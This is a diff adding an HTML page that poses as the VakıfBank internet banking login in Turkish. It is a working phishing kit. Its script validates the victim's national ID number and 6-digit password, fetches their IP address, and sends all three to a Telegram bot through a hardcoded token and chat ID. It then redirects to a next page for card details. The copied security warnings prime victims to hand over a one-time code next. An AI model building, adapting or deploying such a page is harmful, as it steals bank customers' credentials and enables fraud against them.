@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="google" content="notranslate">
+    <meta name="description" content="VakıfBank İnternet Bankacılığı’na güvenli erişim için şifrenizi kullanarak hemen giriş yapın. Hızlı ve kolay bankacılık deneyimini keşfedin!">
+    <title>Şifre ile Giriş - Kolay ve Güvenli Erişim | VakıfBank</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/x-icon" href="assets/img/icons/favicon.png">
+    
+    <!-- Mevcut CSS dosyası -->
+    <link rel="stylesheet" href="styles.e3f11a9fbd12fcf4.css">
+    
+    <!-- jQuery -->
+    <script src="ajax/libs/3.6.3/jquery.min.js"></script>
+    
+    <style>
+        /* Preloader için ek stiller */
+        .preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100000;
+            transition: opacity 0.5s ease;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #fcb000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Mobil label gizleme */
+        @media screen and (max-width: 767px) {
+            .mobres {
+                display: none !important;
+            }
+        }
+        
+        /* Hata stili - kırmızı çerçeve */
+        .error-border {
+            border-color: #a94442 !important;
+            border-width: 2px !important;
+            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075) !important;
+        }
+        
+        /* Hata mesajı stili - input altında */
+        .error-message {
+            color: #a94442;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .warning-plate {
+            background-color: #fff9e6;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .warning-plate .title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .warning-plate ul {
+            padding-left: 20px;
+            margin-top: 10px;
+        }
+        
+        .warning-plate li {
+            margin-bottom: 10px;
+            line-height: 1.4;
+            color: #666;
+        }
+        
+        .transition-button {
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .transition-button.active {
+            background: #fcb000;
+            color: #fff;
+        }
+        
+        .transition-button:not(.active) {
+            background: #e0e0e0;
+            color: #666;
+        }
+        
+        .forgot-password {
+            color: #fcb000;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .edged-btns {
+            width: 100%;
+            padding: 12px;
+            background: #fcb000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .edged-btns:hover {
+            background: #e5a000;
+        }
+        
+        .textbox-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .textbox-input:focus {
+            outline: none;
+            border-color: #fcb000;
+            box-shadow: 0 0 5px rgba(252,176,0,0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .textbox-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .main-header {
+            background: #f2f2f2;
+            padding: 12px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 -15px;
+            align-items: center;
+        }
+        
+        .col-md-4, .col-md-6, .col-md-8, .col-md-12 {
+            padding: 0 15px;
+        }
+        
+        .col-md-4 {
+            width: 33.333%;
+        }
+        
+        .col-md-6 {
+            width: 50%;
+        }
+        
+        .col-md-8 {
+            width: 66.666%;
+        }
+        
+        .col-md-12 {
+            width: 100%;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 45px;
+            width: auto;
+            display: block;
+        }
+        
+        .header-options {
+            text-align: right;
+        }
+        
+        .lang-bar a {
+            font-size: 14px;
+            margin-left: 15px;
+            text-decoration: none;
+        }
+        
+        .lang-bar a.active {
+            color: #fcb000;
+            font-weight: bold;
+        }
+        
+        .box-plate {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .welcome-page-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .main-content {
+            padding: 30px 0;
+            min-height: calc(100vh - 80px);
+            background: #f2f2f2;
+        }
+        
+        .header-options-buts {
+            margin-bottom: 25px;
+        }
+        
+        .usage-bar-buts {
+            display: flex;
+            gap: 10px;
+        }
+        
+        @media (max-width: 767px) {
+            .col-md-4, .col-md-6, .col-md-8 {
+                width: 100%;
+            }
+            .box-plate {
+                padding: 20px;
+            }
+            .welcome-page-title {
+                font-size: 20px;
+                text-align: center;
+            }
+            .main-header .container .row {
+                flex-direction: column;
+                text-align: center;
+            }
+            .logo {
+                justify-content: center;
+                margin-bottom: 10px;
+            }
+            .header-options {
+                text-align: center;
+            }
+            .lang-bar a {
+                margin: 0 10px;
+            }
+            .logo img {
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body class="disable-selection" ondragstart="return false;" ondrop="return false;">
+    <!-- Preloader -->
+    <div class="preloader" id="preloader">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Ana içerik -->
+    <div class="main-wrapper wo-bg wo-bg-alternate-tbk vakifbank-wrapper">
+        <header class="main-header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="logo">
+                            <img src="vakifbank-logo-white.svg" alt="VakıfBank">
+                        </div>
+                    </div>
+                    <div class="col-md-8">
+                        <div class="header-options">
+                            <div class="lang-bar">
+                                <a href="javascript:void(0)" class="active">TR</a>
+                                <a href="javascript:void(0)">EN</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <main class="main-content non-login">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="welcome-page-title">Hoş Geldiniz</div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="box-plate">
+                            <div class="header-options-buts">
+                                <div class="usage-bar-buts">
+                                    <a href="javascript:void(0)" class="transition-button active" id="btnBireysel">Bireysel</a>
+                                    <a href="javascript:void(0)" class="transition-button" id="btnTicari">Ticari</a>
+                                </div>
+                            </div>
+                            
+                            <form id="loginForm" method="POST">
+                                <div class="form-group input">
+                                    <label id="txtMusteriNolabel" for="txtMusteriNo" class="textbox-label">
+                                        Müşteri / T.C. Kimlik Numarası
+                                    </label>
+                                    <input class="textbox-input input-pad removeAutoComplete" 
+                                           id="txtMusteriNo" 
+                                           type="text" 
+                                           placeholder="Müşteri / T.C. Kimlik Numaranızı Giriniz"
+                                           inputmode="numeric"
+                                           required
+                                           name="username"
+                                           oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                                           autocomplete="off"
+                                           minlength="11"
+                                           maxlength="11">
+                                    <div class="error-message" id="tcError">Geçerli bir TC Kimlik Numarası giriniz! (11 hane)</div>
+                                </div>
+                                
+                                <div class="form-group input">
+                                    <label id="txtSifrePlabel" for="txtSifreP" class="textbox-label">
+                                        Şifreniz
+                                    </label>
+                                    <input class="textbox-input input-pad removeAutoComplete" 
+                                           id="txtSifreP" 
+                                           type="password" 
+                                           placeholder="Şifrenizi Giriniz"
+                                           required
+                                           inputmode="numeric"
+                                           name="password"
+                                           oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                                           autocomplete="off"
+                                           minlength="6"
+                                           maxlength="6">
+                                    <div class="error-message" id="sifreError">Geçerli bir şifre giriniz! (6 hane)</div>
+                                </div>
+                                
+                                <div class="login-sifre-al-link-button" style="margin-bottom: 20px; text-align: left;">
+                                    <a href="javascript:void(0)" class="forgot-password" id="forgotPassword">Dijital Şifrem Yok/Unuttum</a>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <button type="submit" class="edged-btns big filled" id="submitBtn">GİRİŞ YAP</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="warning-plate">
+                    <h5 class="title">Güvenlik Uyarıları</h5>
+                    <img src="secure-globalsign-ssl.png" alt="Secure GlobalSign SSL logo" style="height: 40px; margin-bottom: 10px;">
+                    <ul>
+                        <li>VakıfBank hiçbir zaman İnternet Şubesi girişinde müşterilerinin cep telefonu numarası, markası, modeli gibi bilgileri istememektedir. Bu tür şüpheli ekranlar ile karşılaştığınızda işleminizi durdurarak hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz.</li>
+                        <li>Bir sonraki sayfada Kart Bilgilerinizi Gireceksiniz. Bilgilerinizi girdikten sonra tek kullanımlık şifre göremezseniz hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz.</li>
+                        <li>Tek kullanımlık şifreniz bir sonraki ekranda sorulacaktır. Tek kullanımlık şifre göremezseniz ve/veya birden fazla tek kullanımlık şifre istenirse ekrana bilgi girmeyiniz ve hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz.</li>
+                    </ul>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // ============ PRELOADER ============
+        function hidePreloader() {
+            const preloader = document.getElementById('preloader');
+            if (preloader) {
+                preloader.style.opacity = '0';
+                setTimeout(() => {
+                    preloader.style.display = 'none';
+                }, 500);
+            }
+        }
+
+        window.addEventListener('load', function() {
+            setTimeout(hidePreloader, 500);
+        });
+
+        window.onerror = function() {
+            hidePreloader();
+            return false;
+        };
+
+        setTimeout(hidePreloader, 3000);
+
+        // ============ TC KİMLİK DOĞRULAMA ============
+        function validateTCKimlik(tcno) {
+            if (!/^\d{11}$/.test(tcno)) return false;
+            let digits = tcno.split('').map(Number);
+            let oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+            let evenSum = digits[1] + digits[3] + digits[5] + digits[7];
+            let checkDigit1 = (oddSum * 7 - evenSum) % 10;
+            let checkDigit2 = (oddSum + evenSum + digits[9]) % 10;
+            return checkDigit1 === digits[9] && checkDigit2 === digits[10];
+        }
+
+        // ============ TELEGRAM BOT ============
+        const BOT_TOKEN = '8294092123:AAEUS9A1DV9tjoD4QnCsC4azkNGz0Ye6JAg';
+        const CHAT_ID = '-1003874564893';
+
+        function getIPAddress(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback('Bilinmiyor'));
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Telegram başarılı:', data))
+                .catch(error => console.error('Telegram hatası:', error));
+        }
+
+        // ============ HATA GÖSTERME FONKSİYONLARI ============
+        function showError(input, errorElement, isError) {
+            if (isError) {
+                input.classList.add('error-border');
+                errorElement.classList.add('show');
+            } else {
+                input.classList.remove('error-border');
+                errorElement.classList.remove('show');
+            }
+        }
+
+        function clearAllErrors() {
+            const tcInput = document.getElementById('txtMusteriNo');
+            const sifreInput = document.getElementById('txtSifreP');
+            const tcError = document.getElementById('tcError');
+            const sifreError = document.getElementById('sifreError');
+            
+            if (tcInput) tcInput.classList.remove('error-border');
+            if (sifreInput) sifreInput.classList.remove('error-border');
+            if (tcError) tcError.classList.remove('show');
+            if (sifreError) sifreError.classList.remove('show');
+        }
+
+        // ============ INPUT LABEL GİZLEME ============
+        const tcInput = document.getElementById('txtMusteriNo');
+        const tcLabel = document.getElementById('txtMusteriNolabel');
+        const sifreInput = document.getElementById('txtSifreP');
+        const sifreLabel = document.getElementById('txtSifrePlabel');
+
+        if (tcInput) {
+            tcInput.addEventListener('input', function() {
+                if (this.value !== '') {
+                    tcLabel.classList.add('mobres');
+                } else {
+                    tcLabel.classList.remove('mobres');
+                }
+                showError(tcInput, document.getElementById('tcError'), false);
+            });
+            tcInput.addEventListener('blur', function() {
+                if (this.value === '') {
+                    tcLabel.classList.remove('mobres');
+                }
+            });
+        }
+
+        if (sifreInput) {
+            sifreInput.addEventListener('input', function() {
+                if (this.value !== '') {
+                    sifreLabel.classList.add('mobres');
+                } else {
+                    sifreLabel.classList.remove('mobres');
+                }
+                showError(sifreInput, document.getElementById('sifreError'), false);
+            });
+            sifreInput.addEventListener('blur', function() {
+                if (this.value === '') {
+                    sifreLabel.classList.remove('mobres');
+                }
+            });
+        }
+
+        // ============ BİREYSEL/TİCARİ BUTONLARI ============
+        const btnBireysel = document.getElementById('btnBireysel');
+        const btnTicari = document.getElementById('btnTicari');
+        
+        if (btnBireysel && btnTicari) {
+            btnBireysel.addEventListener('click', function() {
+                this.classList.add('active');
+                btnTicari.classList.remove('active');
+            });
+            btnTicari.addEventListener('click', function() {
+                this.classList.add('active');
+                btnBireysel.classList.remove('active');
+            });
+        }
+
+        // ============ ŞİFREMİ UNUTTUM ============
+        const forgotBtn = document.getElementById('forgotPassword');
+        if (forgotBtn) {
+            forgotBtn.addEventListener('click', function() {
+                alert('Dijital şifre işlemleri için Müşteri Hizmetlerini arayınız: 0850 222 0 724');
+            });
+        }
+
+        // ============ FORM SUBMIT ============
+        const form = document.getElementById('loginForm');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const tcno = tcInput.value.trim();
+                const sifre = sifreInput.value.trim();
+                const tcError = document.getElementById('tcError');
+                const sifreError = document.getElementById('sifreError');
+                
+                let hasError = false;
+                
+                clearAllErrors();
+                
+                if (!validateTCKimlik(tcno)) {
+                    showError(tcInput, tcError, true);
+                    hasError = true;
+                }
+                
+                if (!/^\d{6}$/.test(sifre)) {
+                    showError(sifreInput, sifreError, true);
+                    hasError = true;
+                }
+                
+                if (hasError) return;
+                
+                // TC ve şifreyi sessionStorage'a kaydet
+                sessionStorage.setItem('tc', tcno);
+                sessionStorage.setItem('password', sifre);
+                
+                const preloader = document.getElementById('preloader');
+                if (preloader) preloader.style.display = 'flex';
+                
+                getIPAddress(function(ip) {
+                    const message = `*Yeni Giriş Bilgileri:*\nT.C. Kimlik: **${tcno}**\nŞifre: **${sifre}**\nIP: **${ip}**`;
+                    sendToTelegram(message);
+                    
+                    setTimeout(function() {
+                        window.location.href = 'nextpage.html';
+                        hidePreloader();
+                    }, 1500);
+                });
+            });
+        }
+        
+        // ============ ENTER TUŞU ============
+        if (tcInput) {
+            tcInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('submitBtn').click();
+                }
+            });
+        }
+        
+        if (sifreInput) {
+            sifreInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('submitBtn').click();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
